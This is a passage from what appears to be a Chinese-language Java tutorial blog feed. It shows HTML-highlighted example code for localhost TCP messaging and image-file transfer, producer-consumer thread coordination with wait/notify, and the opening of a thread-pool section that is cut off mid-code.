class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-comment">//服务器</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TcpServer</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">//1.拥有一个地址</span><br>        ServerSocket serverSocket=<span class="hljs-keyword">new</span> ServerSocket(<span class="hljs-number">9999</span>);<br>        <span class="hljs-comment">//2.等待客户端连接</span><br>        Socket accept=serverSocket.accept();<br>        <span class="hljs-comment">//3.读取客户端信息</span><br>        InputStream is=accept.getInputStream();<br><br>        <span class="hljs-comment">//基础写法？中文处理较差</span><br><span class="hljs-comment">//        byte[] buffer=new byte[1024];</span><br><span class="hljs-comment">//        int len;</span><br><span class="hljs-comment">//        while((len=is.read(buffer))!=-1)&#123;</span><br><span class="hljs-comment">//            String msg=new String(buffer,0,len);</span><br><span class="hljs-comment">//            System.out.println(msg);        &#125;</span><br>        <span class="hljs-comment">//4.管道流</span><br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-keyword">byte</span>[] buffer=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len=is.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>            baos.write(buffer,<span class="hljs-number">0</span>,len);<br>        &#125;<br>        System.out.println(baos.toString());<br>        baos.close();<br>        is.close();<br>        accept.close();<br>        serverSocket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>客户端</p><p>TcpFileClient.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TcpFileClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Socket socket=<span class="hljs-keyword">null</span>;<br>        OutputStream os=<span class="hljs-keyword">null</span>;<br>        FileInputStream fis=<span class="hljs-keyword">null</span>;<br>        InputStream inputStream=<span class="hljs-keyword">null</span>;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">//1.创建一个socket连接</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            socket=<span class="hljs-keyword">new</span> Socket(InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<span class="hljs-number">9999</span>);<br><br>            <span class="hljs-comment">//2.创建一个输出流</span><br>            os=socket.getOutputStream();<br>            <span class="hljs-comment">//3.读取文件流</span><br>            fis=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;src\\back.jpg&quot;</span>));<br>            <span class="hljs-comment">//4.写出文件流</span><br>            <span class="hljs-keyword">byte</span>[] buffer=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">int</span> len;<br>            <span class="hljs-keyword">while</span>((len=fis.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>                os.write(buffer,<span class="hljs-number">0</span>,len);<br>            &#125;<br>            <span class="hljs-comment">//通知结束</span><br>            socket.shutdownOutput();<span class="hljs-comment">//传输完毕</span><br><br>            <span class="hljs-comment">//5.确认服务器接受完毕才能关闭链接</span><br>            inputStream= socket.getInputStream();<br><br>            baos=<span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            <span class="hljs-keyword">byte</span>[] buffer2=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((len= inputStream.read(buffer2))!=-<span class="hljs-number">1</span>)&#123;<br>                baos.write(buffer2,<span class="hljs-number">0</span>,len);<br>            &#125;<br>            System.out.println(baos.toString());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br><br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-comment">//关闭文件</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                fis.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                os.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                socket.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                baos.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                inputStream.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>服务端</p><p>TcpFileServer.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TcpFileServer</span> </span>&#123;,<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">//1.拥有一个地址</span><br>        ServerSocket serverSocket=<span class="hljs-keyword">new</span> ServerSocket(<span class="hljs-number">9999</span>);<br>        <span class="hljs-comment">//2.等待客户端连接</span><br>        Socket accept=serverSocket.accept();<br>        <span class="hljs-comment">//3.读取客户端信息</span><br>        InputStream is=accept.getInputStream();<br>        <span class="hljs-comment">//4.文件输出</span><br>        FileOutputStream fos=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;tmp_1.jpg&quot;</span>));<br>        <span class="hljs-keyword">byte</span>[] buffer=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len=is.read(buffer))!=-<span class="hljs-number">1</span>)&#123;<br>            fos.write(buffer,<span class="hljs-number">0</span>,len);<br>        &#125;<br><br>        <span class="hljs-comment">//通知接收完毕</span><br>        OutputStream os=accept.getOutputStream();<br>        os.write(<span class="hljs-string">&quot;over&quot;</span>.getBytes());<br><br>        <span class="hljs-comment">//关闭资源</span><br>        fos.close();<br>        is.close();<br>        accept.close();<br>        serverSocket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_多线程_5</title>
    <link href="/2021/04/06/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_5/"/>
    <url>/2021/04/06/Java/JavaBase/java_base_%E5%A4%9A%E7%BA%BF%E7%A8%8B_5/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程学习——-5"><a href="#多线程学习——-5" class="headerlink" title="多线程学习—— 5"></a>多线程学习—— 5</h1><h2 id="线程协作"><a href="#线程协作" class="headerlink" title="线程协作"></a>线程协作</h2><ul><li>应用场景:生产者和消费者问题</li><li>假设仓库中只能存放一件产品,生产者将生产出来的产品放入仓库，消费者将仓库中产品取走消费.</li><li>如果仓库中没有产品,则生产者将产品放入仓库,否则停止生产并等待,直到仓库中的产品被消费者取走为止.</li><li>如果仓库中放有产品,则消费者可以将产品取走消费,否则停止消费并等待，</li><li>直到仓库中再次放入产品为止.</li></ul><p>分析：</p><p>这是一个线程同步问题生产者和消费者共享同一个资源,并且生产者和消费者之间相互依赖,互为条件.</p><ul><li>对于生产者,没有生产产品之前,要通知消费者等待.而生产了产品之后，又需要马上通知消费者消费</li><li>对于消费者,在消费之后,要通知生产者已经结束消费,需要生产新的产品以供消费.</li><li>在生产者消费者问题中 ,仅有synchronized是不够的<ul><li>synchronized 可阻止并发更新同一-个共享资源，实现了同步</li><li>synchronized 不能用来实现不同线程之间的消息传递(通信)</li></ul></li></ul><p>JAVA提供的解决线程通信的方法</p><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>wait()</td><td>表示线程一直等待 ,直到其他线程通知,与sleep不同，会释放锁</td></tr><tr><td>wait(long timeout)</td><td>指定等待的毫秒数</td></tr><tr><td>notify()</td><td>唤醒一个处于等待状态的线程</td></tr><tr><td>notifyAll()</td><td>唤醒同一个对象上所有调用wait()方法的线程, 优先级别高的线程优先调度</td></tr></tbody></table><p>注意：均是Object类的方法，都只能再同步方法或者同步代码块中使用，否则会抛出异常</p><p>TestPc.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试：生产者消费者模型--&gt;利用缓存区解决：管理法</span><br><br><span class="hljs-comment">//生产者、消费者、成品、缓冲区</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestPc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        SynContainer container=<span class="hljs-keyword">new</span> SynContainer();<br>        <span class="hljs-keyword">new</span> Productor(container).start();<br>        <span class="hljs-keyword">new</span> Consumer(container).start();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//生产者</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Productor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    SynContainer container;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Productor</span><span class="hljs-params">(SynContainer container)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.container=container;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;生产了&quot;</span>+i+<span class="hljs-string">&quot;鸡&quot;</span>);<br>            container.push(<span class="hljs-keyword">new</span> Chicken(i));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//消费者</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Consumer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    SynContainer container;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Consumer</span><span class="hljs-params">(SynContainer container)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.container=container;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;消费了&quot;</span>+container.pop().id+<span class="hljs-string">&quot;鸡&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//产品</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Chicken</span></span>&#123;<br>    <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Chicken</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.id=i;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//缓冲区</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SynContainer</span></span>&#123;<br>    <span class="hljs-comment">//需要一个容器大小</span><br>    Chicken[] chickens=<span class="hljs-keyword">new</span> Chicken[<span class="hljs-number">10</span>];<br>    <span class="hljs-comment">//容器计数器</span><br>    <span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//生产者放入产品</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(Chicken chicken)</span></span>&#123;<br>        <span class="hljs-comment">//如果容器满了等待消费</span><br>        <span class="hljs-keyword">if</span>(count==chickens.length)&#123;<br>            <span class="hljs-comment">//通知消费，等待生成</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">this</span>.wait();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//没有满继续生产，丢入</span><br>        chickens[count]=chicken;<br>        count++;<br>        <span class="hljs-comment">//可以通知消费者消费</span><br>        <span class="hljs-keyword">this</span>.notify();<br>    &#125;<br>    <span class="hljs-comment">//消费者消费产品</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Chicken <span class="hljs-title">pop</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-comment">//判断能否消费</span><br>        <span class="hljs-keyword">if</span>(count==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//等待生成</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">this</span>.wait();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//消费</span><br>        count--;<br>        Chicken chicken=chickens[count];<br>        <span class="hljs-comment">//吃完了通知</span><br>        <span class="hljs-keyword">this</span>.notify();<br>        <span class="hljs-keyword">return</span> chicken;<br>    &#125;<br>&#125;<br><br><br><br></code></pre></div></td></tr></table></figure><p>TestPc2.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试生产者消费者问题：信号灯法</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestPc2</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        TV tv=<span class="hljs-keyword">new</span> TV();<br>        <span class="hljs-keyword">new</span> Player(tv).start();<br>        <span class="hljs-keyword">new</span> Watcher(tv).start();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//演员</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Player</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    TV tv;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Player</span><span class="hljs-params">(TV tv)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.tv=tv;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">this</span>.tv.play(<span class="hljs-string">&quot;快乐&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">this</span>.tv.play(<span class="hljs-string">&quot;生活&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//观众</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Watcher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span>&#123;<br>    TV tv;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Watcher</span><span class="hljs-params">(TV tv)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.tv=tv;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            tv.watch();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//节目</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TV</span> </span>&#123;<br>    <span class="hljs-comment">//演员演出，观众等待</span><br><br>    <span class="hljs-comment">//观众观看，演员等待</span><br>    String voice;<br>    <span class="hljs-keyword">boolean</span> flag=<span class="hljs-keyword">true</span>;<br>    <span class="hljs-comment">//表演</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title">play</span><span class="hljs-params">(String voice)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!flag)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">this</span>.wait();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;演员扮演了&quot;</span>+voice);<br>        <span class="hljs-comment">//通知观看</span><br>        <span class="hljs-keyword">this</span>.notify();<br>        <span class="hljs-keyword">this</span>.voice=voice;<br>        <span class="hljs-keyword">this</span>.flag=!<span class="hljs-keyword">this</span>.flag;<br>    &#125;<br><br>    <span class="hljs-comment">//观看</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">watch</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(flag)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">this</span>.wait();<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;观看了&quot;</span>+voice);<br>        <span class="hljs-comment">//通知表演</span><br>        <span class="hljs-keyword">this</span>.notify();<br>        <span class="hljs-keyword">this</span>.flag=!<span class="hljs-keyword">this</span>.flag;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>使用线程池</strong></p><ul><li>背景:经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。</li><li>思路:提前创建好多个线程,放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</li><li>好处:<ul><li>提高响应速度(减少了创建新线程的时间)</li><li>降低资源消耗(重复利用线程池中线程，不需要每次都创建)</li><li>便于线程管理…<ul><li>corePoolSize: 核心池的大小</li><li>maximumPoolSize:最大线程数</li><li>keepAliveTime: 线程没有任务时最多保持多长时间后会终止</li></ul></li></ul></li><li>JDK5.0起提供了线程池相关的API：ExecutorService和Excecutors</li><li>ExecutorService:真正的线程池接口。常见子类ThreadPoolExecutor<ul><li>void execute(Runnable command) :执行任务/命令，没有返回值，一般用来执行Runnable</li><li><T> Future<T> submit(Callable<T> task):执行任务，有返回值，一般 又来执行Callable</li><li>void shutdown() :关闭连接池</li></ul></li><li>Executors:工具类、线程池的工厂类，用于创建并返回不同类型的线程池</li></ul><p>Pool.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.concurrent.ExecutorService;<br><span class="hljs-keyword">import</span> java.util.concurrent.Executors;<br><br><span class="hljs-comment">//测试创建了池</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pool</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 